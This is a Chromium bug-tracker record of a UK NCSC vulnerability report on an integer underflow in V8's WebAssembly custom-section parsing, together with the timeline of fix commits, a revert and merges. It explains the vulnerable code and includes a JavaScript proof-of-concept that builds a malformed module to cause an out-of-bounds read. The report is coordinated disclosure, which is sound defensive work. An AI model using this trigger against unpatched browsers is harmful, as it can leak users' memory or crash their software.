# Security: NCSC Vulnerability Report - Google Chrome - V8 JavaScript Engine

| Field | Value |
|-------|-------|
| **Issue ID** | [40089731](https://issues.chromium.org/issues/40089731) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>JavaScript>WebAssembly |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | se...@ncsc.gov.uk |
| **Assignee** | ti...@chromium.org |
| **Created** | 2017-11-30 |
| **Bounty** | $2,000.00 |

## Description

NCSC Vulnerability Report - Google Chrome - V8 JavaScript Engine

NCSC REF: 72092259 / VULNERABILITY ID: 495033


About This Document
------------------
This document details a vulnerability identified by the National Cyber Security Centre (NCSC) in Google's V8 JavaScript Engine.


Bug Bounty Payment
------------------
If this vulnerability is eligible for a Bug Bounty payment, we ask that the money be donated directly to NSPCC, (Registered Charity Number: 216401), https://www.nspcc.org.uk.

Please contact the NCSC mailbox to inform us of the donation amount and the donation date.


NCSC Contact Information
------------------------
The vulnerability disclosure mailbox is security@ncsc.gov.uk.  Please contact us for our PGP key. 


Crediting NCSC
------------------------
NCSC would appreciate appropriate credit as The UK's National Cyber Security Centre (NCSC) in any advisories which you may publish about this issue.
Verification, Resolution and Release
Please inform NCSC via the security@ncsc.gov.uk mailbox, quoting the NCSC Reference above, should you:
confirm that this is a security issue
allocate the issue a CVE identifier
determine a date to release a patch
determine a date to publish advisories


NCSC Disclosure Policy
------------------------
NCSC has adopted the ISO 29147 approach to vulnerability disclosure and, as such, follows a coordinated disclosure approach with affected parties. We have never publicly disclosed a vulnerability prior to a fix being made available.

NCSC recognises that vendors need a reasonable amount of time to mitigate a vulnerability, for example, to understand the impact to customers, to triage against other vulnerabilities, to implement a fix in coordination with others, and to make that fix available to its customers. As this will vary based on the exact situation NCSC does not define a set time frame in which a fix must be made available, and we are happy to discuss the circumstances of any particular disclosure.

If NCSC believes a vendor is not making appropriate progress with vulnerability resolution, we may, after discussion with the vendor, choose to share the details appropriately (for example, with service providers and our customers) to ensure that we provide appropriate mitigation of the threat to the UK and to UK interests.

Disclaimer
------------------------
Any NCSC findings and recommendations made have not been provided with the intention of avoiding all risks, and following the recommendations will not remove all such risk. Ownership of information risks remains with the relevant system owner at all times.


Summary
-------
An integer underflow vulnerability has been discovered in the WebAssembly (WASM) feature of Google's V8 JavaScript engine which affects the latest version. The vulnerability can be exploited to cause a crash, or to disclose the contents of memory depending on the layout of the heap.

This vulnerability has a Severity Score of 4.3 and a  Severity Rating (based on the Common Vulnerability Scoring System v2).  The Severity Score and Severity Rating are calculated from the Exploitability and Impact Metrics in Table 1. Table 2 presents a summary of these vulnerability metrics.


CVSS
----
This vulnerability has a Severity Score of 4.3 and a Medium Severity Rating: AV:Network/AC:Medium/Au:None/C:None/I:None/A:Partial.  The Common Weakness Enumeration ID is CWE-20: Improper Input Validation.


Details
-------
WebAssembly modules are defined by a header followed by a number of typed sections. Each of these sections uses a number to identify its type, followed by a section length and a pre-determined structure for the data relating to that type. Sections of a given type are optional, specified in numeric order, and can occur at most once in a module. As well as the pre-defined section types, it's possible to specify custom sections which can be used for storage of arbitrary data as part of a WASM module. Custom sections also contain a section length, which is followed by a string which is used to query the custom section by name at a later point.
 
Querying custom sections for a WASM module is done via the WebAssembly.Module.customSections function which is exposed to JavaScript. This function takes two arguments, a compiled WASM module and a string which represents the name of the custom section being requested. This function takes the module and re-parses it, focussing only on sections identified with the custom section type. Once it has a list of the custom sections of a module, it compares the name of each to the name being requested, and if a match is found, it returns the payload data.
 
The following code snippet from DecodeCustomSections shows the logic for re-parsing the module to look for custom sections:

src\wasm\module-decoder.cc
===============================================================================
while (decoder.more()) { 
    byte section_code = decoder.consume_u8("section code"); 
    uint32_t section_length = decoder.consume_u32v("section length");                       [1] 
    uint32_t section_start = decoder.pc_offset(); 
    if (section_code != 0) { 
      // Skip known sections. 
      decoder.consume_bytes(section_length, "section bytes"); 
      continue; 
    } 
    uint32_t name_length = decoder.consume_u32v("name length"); 
    uint32_t name_offset = decoder.pc_offset(); 
    decoder.consume_bytes(name_length, "section name"); 
    uint32_t payload_offset = decoder.pc_offset(); 
    uint32_t payload_length = section_length - (payload_offset - section_start);            [2] 
    decoder.consume_bytes(payload_length);                                                                [3] 
    result.push_back({{section_start, section_length}, 
                      {name_offset, name_length}, 
                      {payload_offset, payload_length}}); 
  }
===============================================================================

The loop starts by consuming a byte that represents the section type, and a variable length uint32 for the section length [1]. It then takes the current offset as the start of the section, and proceeded to parse the section name. The payload length is calculated as the section_length minus the length of the name string at [2], however no check is made to ensure that the section length is valid. Specifically, section_length is not verified to be greater than the length of the name portion of the section, which can cause the operation at [2] to underflow and return a large value as the payload_length. This should make the call to consume_bytes at [3] fail, but as this function uses its own decoder (which is not checked to detect if an error has occurred), result is populated with invalid values for the section.
 
Looking back at the calling function, the results are processed as follows:

src\wasm\wasm-module.cc
===============================================================================
for (auto& section : custom_sections) { 
    MaybeHandle<String> section_name = 
        WasmCompiledModule::ExtractUtf8StringFromModuleBytes( 
            isolate, compiled_module, section.name);
    if (!name->Equals(*section_name.ToHandleChecked())) continue;                             [4] 
... 
    memcpy(memory, start + section.payload.offset(), section.payload.length());             [5]

===============================================================================

At [4], we verify that the section's name matches what was requested in the call to WebAssembly.Module.customSections. If it does, we continue on to prepare to copy the section payload into an arraybuffer we will then return. At [5], memory represents the backing store of this arraybuffer, and the section.payload.length() is the invalid payload_length returned from DecodeCustomSections. This results in an out-of-bounds read off the end of start, which contains the WASM module bytes, but we quickly reach the end of the page.

Exploiting this issue will either leak the contents of several memory pages that are adjacent to our WASM module bytes, or cause an access violation as soon as it attempts to read a page which is not mapped.


Proof of Concept
------
The following proof-of-concept code will trigger this issue in a debug build of the d8 shell. The code creates an ArrayBuffer which represents the bytes of a WebAssembly module, and populates it with a single custom section with a name consisting of a long string of 'A's. It then compiles the module and asks for the custom section from the module, triggering the bug.

Note that this will trigger a DCHECK before crashing in the debug build - this can be commented out in order to see the impact of the bug in a release build (where the DCHECK would not be present).

test.js
===============================================================================

var string_len = 0x0ffffff0 - 19;

print("Allocating backing store");
var backing = new ArrayBuffer(string_len + 19);

print("Allocating typed array buffer");
var buffer = new Uint8Array(backing);

print("Filling...");
buffer.fill(0x41);

print("Setting up array buffer");
// Magic
buffer.set([0x00, 0x61, 0x73, 0x6D], 0);
// Version
buffer.set([0x01, 0x00, 0x00, 0x00], 4);
// kUnknownSection (0)
buffer.set([0], 8);
// Section length
buffer.set([0x80, 0x80, 0x80, 0x80, 0x00],  9); 
// Name length
buffer.set([0xDE, 0xFF, 0xFF, 0x7F], 14); 

print("Parsing module...");
var m = new WebAssembly.Module(buffer);

print("Triggering!");
var c = WebAssembly.Module.customSections(m, "A".repeat(string_len + 1));

===============================================================================


Mitigation
----------
Values read from untrusted WebAssembly module bytes should be properly validated to ensure that they are correct and appropriate.




## Timeline

### el...@chromium.org (2017-11-30)

[Empty comment from Monorail migration]

[Monorail components: Blink>JavaScript>WebAssembly]

### ti...@chromium.org (2017-11-30)

[Empty comment from Monorail migration]

### bu...@chromium.org (2017-11-30)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/163c1c82622f09f64fe7c3a1c93f81b566200493

commit 163c1c82622f09f64fe7c3a1c93f81b566200493
Author: Ben L. Titzer <titzer@chromium.org>
Date: Thu Nov 30 18:25:09 2017

[wasm] Gracefully handle malformed custom sections in WebAssembly.Module.customSections().

R=clemensh@chromium.org
BUG=chromium:789952

Change-Id: Ida627fa6cdeacff01a0ec4d20e58281f17528010
Reviewed-on: https://chromium-review.googlesource.com/800941
Reviewed-by: Clemens Hammacher <clemensh@chromium.org>
Commit-Queue: Ben Titzer <titzer@chromium.org>
Cr-Commit-Position: refs/heads/master@{#49767}
[modify] https://crrev.com/163c1c82622f09f64fe7c3a1c93f81b566200493/src/wasm/module-decoder.cc
[add] https://crrev.com/163c1c82622f09f64fe7c3a1c93f81b566200493/test/mjsunit/regress/wasm/regress-789952.js


### ti...@chromium.org (2017-11-30)

[Empty comment from Monorail migration]

### ti...@chromium.org (2017-11-30)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-11-30)

This bug requires manual review: We don't branch M64 until 2017-11-30.
Please contact the milestone owner if you have questions.
Owners: cmasso@(Android), cmasso@(iOS), kbleicher@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2017-11-30)

This bug requires manual review: We are only 4 days from stable.
Please contact the milestone owner if you have questions.
Owners: cmasso@(Android), cmasso@(iOS), gkihumba@(ChromeOS), govind@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### bu...@chromium.org (2017-11-30)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/b9a649c1ceb7797b40c5acf96a01ec90e94dfb02

commit b9a649c1ceb7797b40c5acf96a01ec90e94dfb02
Author: Clemens Hammacher <clemensh@chromium.org>
Date: Thu Nov 30 19:07:55 2017

Revert "[wasm] Gracefully handle malformed custom sections in WebAssembly.Module.customSections()."

This reverts commit 163c1c82622f09f64fe7c3a1c93f81b566200493.

Reason for revert: Throws std::bad_alloc on linux: https://build.chromium.org/p/client.v8/builders/V8%20Linux/builds/21927; needs investigation.

Original change's description:
> [wasm] Gracefully handle malformed custom sections in WebAssembly.Module.customSections().
> 
> R=​clemensh@chromium.org
> BUG=chromium:789952
> 
> Change-Id: Ida627fa6cdeacff01a0ec4d20e58281f17528010
> Reviewed-on: https://chromium-review.googlesource.com/800941
> Reviewed-by: Clemens Hammacher <clemensh@chromium.org>
> Commit-Queue: Ben Titzer <titzer@chromium.org>
> Cr-Commit-Position: refs/heads/master@{#49767}

TBR=titzer@chromium.org,clemensh@chromium.org

Change-Id: I63fbd8f55025f53c453e91d0f7a181c21ae53a39
No-Presubmit: true
No-Tree-Checks: true
No-Try: true
Bug: chromium:789952
Reviewed-on: https://chromium-review.googlesource.com/801554
Reviewed-by: Clemens Hammacher <clemensh@chromium.org>
Commit-Queue: Clemens Hammacher <clemensh@chromium.org>
Cr-Commit-Position: refs/heads/master@{#49768}
[modify] https://crrev.com/b9a649c1ceb7797b40c5acf96a01ec90e94dfb02/src/wasm/module-decoder.cc
[delete] https://crrev.com/163c1c82622f09f64fe7c3a1c93f81b566200493/test/mjsunit/regress/wasm/regress-789952.js


### cl...@chromium.org (2017-11-30)

The fix in #3 is still valid, and can be back-merged, it's just the regression test which is failing. We will fix this tomorrow and reland.

### ca...@chromium.org (2017-11-30)

Please add affected OSs.

### ra...@chromium.org (2017-11-30)

[Empty comment from Monorail migration]

### go...@chromium.org (2017-11-30)

+ awhalley@ (Security TPM) & hablich@ (V8 TPM) for M63 merge review.

Note: We're cutting M63 Desktop Stable RC tomorrow, Friday @ 5:00 PM PT.


### aw...@google.com (2017-11-30)

I don't think we need to rush this to make the stable cut tomorrow. Once it's had some time on dev or beta we should merge to 63 and it can get included in any future spins.


### go...@chromium.org (2017-11-30)

Ok, sounds good. Thank you.

### sh...@chromium.org (2017-12-01)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-12-01)

Please mark security bugs as fixed as soon as the fix lands, and before requesting merges. This update is based on the merge- labels applied to this issue. Please reopen if this update was incorrect.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### bu...@chromium.org (2017-12-01)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/b6ca58e57ec6b1d66c68d9f61eab87c3ca5f6c6c

commit b6ca58e57ec6b1d66c68d9f61eab87c3ca5f6c6c
Author: Ben L. Titzer <titzer@google.com>
Date: Fri Dec 01 14:39:57 2017

Reland "[wasm] Gracefully handle malformed custom sections in WebAssembly.Module.customSections()."

This is a reland of 163c1c82622f09f64fe7c3a1c93f81b566200493
Original change's description:
> [wasm] Gracefully handle malformed custom sections in WebAssembly.Module.customSections().
> 
> R=clemensh@chromium.org
> BUG=chromium:789952
> 
> Change-Id: Ida627fa6cdeacff01a0ec4d20e58281f17528010
> Reviewed-on: https://chromium-review.googlesource.com/800941
> Reviewed-by: Clemens Hammacher <clemensh@chromium.org>
> Commit-Queue: Ben Titzer <titzer@chromium.org>
> Cr-Commit-Position: refs/heads/master@{#49767}

Bug: chromium:789952
Change-Id: Ie17629b3fcbf2d5f78c83be2aa2a6b904a61f3ab
Reviewed-on: https://chromium-review.googlesource.com/803575
Commit-Queue: Ben L. Titzer <titzer@google.com>
Commit-Queue: Ben Titzer <titzer@chromium.org>
Reviewed-by: Clemens Hammacher <clemensh@chromium.org>
Cr-Commit-Position: refs/heads/master@{#49796}
[modify] https://crrev.com/b6ca58e57ec6b1d66c68d9f61eab87c3ca5f6c6c/src/wasm/module-decoder.cc
[add] https://crrev.com/b6ca58e57ec6b1d66c68d9f61eab87c3ca5f6c6c/test/mjsunit/regress/wasm/regress-789952.js


### ha...@chromium.org (2017-12-01)

+1 to #13. Let's give this some proper baking first.

### sh...@chromium.org (2017-12-02)

[Empty comment from Monorail migration]

### aw...@google.com (2017-12-04)

[Empty comment from Monorail migration]

### ab...@chromium.org (2017-12-04)

Approving merge for M64. Branch:3282

### bu...@chromium.org (2017-12-05)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/b299115d88b53dfe18225892c6c813d7ba112705

commit b299115d88b53dfe18225892c6c813d7ba112705
Author: Ben L. Titzer <titzer@google.com>
Date: Tue Dec 05 10:34:58 2017

Merged: Reland "[wasm] Gracefully handle malformed custom sections in WebAssembly.Module.customSections()."

NOTRY=true
NOPRESUBMIT=true
NOTREECHECKS=true

BUG=chromium:789952

This is a reland of 163c1c82622f09f64fe7c3a1c93f81b566200493
Original change's description:
> [wasm] Gracefully handle malformed custom sections in WebAssembly.Module.customSections().
>
> R=clemensh@chromium.org
> BUG=chromium:789952
>
> Change-Id: Ida627fa6cdeacff01a0ec4d20e58281f17528010
> Reviewed-on: https://chromium-review.googlesource.com/800941
> Reviewed-by: Clemens Hammacher <clemensh@chromium.org>
> Commit-Queue: Ben Titzer <titzer@chromium.org>
> Cr-Commit-Position: refs/heads/master@{#49767}

Bug: chromium:789952
Change-Id: Ie17629b3fcbf2d5f78c83be2aa2a6b904a61f3ab
Reviewed-on: https://chromium-review.googlesource.com/803575
Commit-Queue: Ben L. Titzer <titzer@google.com>
Commit-Queue: Ben Titzer <titzer@chromium.org>
Reviewed-by: Clemens Hammacher <clemensh@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#49796}(cherry picked from commit b6ca58e57ec6b1d66c68d9f61eab87c3ca5f6c6c)
Reviewed-on: https://chromium-review.googlesource.com/808225
Cr-Commit-Position: refs/branch-heads/6.4@{#5}
Cr-Branched-From: 0407506af3d9d7e2718be1d8759296165b218fcf-refs/heads/6.4.388@{#1}
Cr-Branched-From: a5fc4e085ee543cb608eb11034bc8f147ba388e1-refs/heads/master@{#49724}
[modify] https://crrev.com/b299115d88b53dfe18225892c6c813d7ba112705/src/wasm/module-decoder.cc
[add] https://crrev.com/b299115d88b53dfe18225892c6c813d7ba112705/test/mjsunit/regress/wasm/regress-789952.js


### cl...@chromium.org (2017-12-05)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-12-08)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2017-12-08)

Thanks for the report folks! We'll be in touch with details about the donation request. Cheers!

### aw...@google.com (2017-12-14)

[Empty comment from Monorail migration]

### ha...@chromium.org (2018-01-02)

I don't think another 63 push will happen anyway.

### aw...@google.com (2018-01-22)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-01-24)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-03-09)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2018-03-27)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### aw...@google.com (2018-10-05)

[Empty comment from Monorail migration]

### is...@google.com (2018-10-05)

This issue was migrated from crbug.com/chromium/789952?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40089731)*
